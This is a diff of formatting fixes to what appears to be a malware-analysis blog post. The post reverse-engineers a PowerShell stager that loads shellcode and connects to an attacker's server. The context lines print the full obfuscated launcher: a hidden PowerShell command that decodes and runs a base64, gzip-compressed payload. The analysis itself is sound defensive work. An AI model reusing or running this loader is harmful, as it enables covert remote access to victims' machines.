@@ -19,7 +19,6 @@ The objective of the shell code is staging where the attacker maintains continue
 The powershell was obfuscated by using base64, and compressed as well. The following shows the powrshell script. 
 
 ```
-```c
 powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAJUtgV0CA7VWa2+bSBT9nEj9D6iyZFAcg1M3zUaKtICxjWtSE2z8WmtFYAwTBnBhiI27/e97x4Y03abddqVFSMzjPs89M5d1HrsUJzH3cWtzn16dnoyc1Ik4vhaEqdTgarj14AgnJ7BR2xN773M3HL+UN5tOEjk4Xl1fq3maopge580eonKWoeieYJTxAvcXNw1Qis4/3D8gl3KfuNqfzR5J7h1SihWq4waIO5djj+0NE9dh4TStDcGUr//xR11YnrdWTe1j7pCMr1tFRlHU9AipC9xngTkcFxvE1w3spkmWrGlziuM3F81JnDlrdAvWHpGBaJB4WV2ANOBNEc3TmDsmxCwc9/k6DEdp4sqel6Isqze4JbO9XK1+55el47s8pjhCTT2mKE02FkofsYuyZt+JPYLu0HoFWhZNceyvBAHEHpMQ8bU4J6TB/YoZ/hZtK9h+Vol/rgRSI5oKDajlS4kaiZcTdFStvxDpgQACPBUJALzPr05fna4rxjxIMn58zhkYnSwPYwQB8qMkwwfBGw6YZIAnhyZpAdPaOM2RsHqCl6tFj1eN76u3KlmQDBPp7QOsLe0EeyvQKYtawz0m+gNudtAax6hTxE6E3Yp+/Es4ozVBhxybldgtBMXXyw3kdRBBvkMZcKzc36hpEaZPukqOiYdS2YVaZRAVlFH4OphjLfi6HhsoAoiOc+BfbQ2kR5V0SfSi8s7mIFRXiZNlDW6Uw6lzG5yFHIK8BifHGS635Jwmh2H9S7hGTih2nYxW5lZCCWPpTk3ijKa5C0WD1MfWBrnYIQyJBtfHHlIKC/uV2/qLOKgOIXASwNIj1AFWWP4WZVRIIUJWdqFpIapHG4IiEDkc/i5xfDjqJd0P1HF85NX/EV9F5iNzGRAVAs+ig+paJKENzsYphSuEgXqg0H/y/uzyYHGoKSrLwFenY6kUlFG6dh+idxYjZInKAYOUQv7dNIkUJ0OX7eM9wb8WNdx5O+okexkerXtn2oo1sRe64Q2IpVNrruHhJAh03NJ9mBcTzR9RafN+PO4PrE5fTju7YC3rma71lcJsKbLbx+/sgTKZgB5Wh+bDTpc9JfJn/lzd6qNgpoMjdejrPnwVPXAVaSH5itRVh5YSaFiSfcvsm+3WQheviIL3lm7J/emTvyc/Wrvdn+3G8q0xkIPuB6/buuge9EOmvwh7w452mLtsbs4zDWvgR+vOTTtAU3ujTLXuwrQ3un+29U17KLa7gQLrOt4NN5YIT6s1eIy9vUGu9gaEa9qLAUYL3UeFL5uybM1jYt1vVUiklSrKIpe6E1gLx3q8M+83hlfM++JvtoHRJpFNTZa7BA5kJDvbjtiaJu9N+6050aRdMZF2W+1B3Gp4sA3L76R3eemL6/ZItC097juBAvEWg3aIB2ewFzm2NF+LNsNPDWNxH8/I5cA4YAr5mKCDGWaOfwd6Rx2ZxvpMFG1f9OU1sXX/yvRnSXzhhGB76ssQIeQItV4PdMOFWAkOJ2czsTWBeKRosJNYrNHgCuxdhC/YtALA1ls4ssLiUKa9RJ6GvUu1uBoZkIfdApuxnY+nfbAJMefhFYMZ6tux1Lhn6bML7/5OEc+8ueMDnmey997fKNhLxZZ5c/OanQM4CLVEfcbu77Umw0mzwCHAemg51UXTTdJu2URGCWYaPM9+P0KUxohA74buXp1XmZDEZU3s2G2ggx77GmuzExi+uXhxJHBPgsKX5lYtXV8vIEq4AQ6HtDlEsU+DhrR7I0nQqaRdW4Ikfz41NdkU/NFWg7U6gObJNjnYFtjVUMv2g+H/ill5HwXw8f4Vsy9rP9j9KRylBsv4m8WvF34J0V9NfOpgCoIW3KYEHZv5d/Iv6fHsh4dVBWq/Lh/2z/ohp+e38B/06vRvUq95ZB8LAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
 ```
 
@@ -110,7 +109,7 @@ Figure 5: The enterypoint of the shellcode.
 ---
 
 In figure 5, a breakpoint has been placed on the entrypoint of the shell code. by giving any input to the "shell-code-injecter.exe" program, the getchar() function returns the input char, and a new thread will be created. Subsequently, the breakpoint on the entrypoint of the shellcode gets hit.
-By stepping into the code, the third instruction call 1FB977200D6 is called, refer to Figure 6.
+By stepping into the code, the third instruction `call 1FB977200D6` is called, refer to Figure 6.
 
 
 ![Figure 6: 1FB977200D6 function](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%205.png)
@@ -155,7 +154,7 @@ int WSAAPI connect(
 );
 ```
 
-The server IP can be retrieved from the second argument `name`. In x64, the first argument is passed in RCX register, while the second argument is passed in `RDX`. Jumping to the RDX value in the debugger dump should reveal the object of the second argument, refer to Figure 11.
+The server IP can be retrieved from the second argument `name`. In x64, the first argument is passed in `RCX` register, while the second argument is passed in `RDX`. Jumping to the `RDX` value in the debugger dump should reveal the object of the second argument, refer to Figure 11.
 
 ![Figure 11: sockaddr_in object in memory](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Embeded_Powershell/Untitled%2010.png)
 
